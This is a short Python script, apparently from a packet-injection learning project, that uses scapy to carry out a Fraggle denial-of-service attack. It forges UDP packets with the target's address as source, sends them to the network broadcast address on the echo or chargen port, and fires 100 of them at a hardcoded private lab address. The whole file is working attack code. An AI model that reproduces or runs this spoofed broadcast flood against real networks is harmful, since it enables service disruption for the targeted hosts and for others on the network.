#! /usr/bin/env python3
#Same as Smurf but using UDP (port 7 echo or 19 chargen).
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send
from packinjection.utils.inet import get_broadcast_ip

def fraggle(target, port=7):
        pkt = IP(src=target, dst=get_broadcast_ip(target))/UDP(dport=port)/b'fraggle'
        print(pkt)
        send(pkt, count=100, inter=0.01) #do while loop for threads ot just more control

if __name__ == '__main__' :
	fraggle("192.168.56.101")
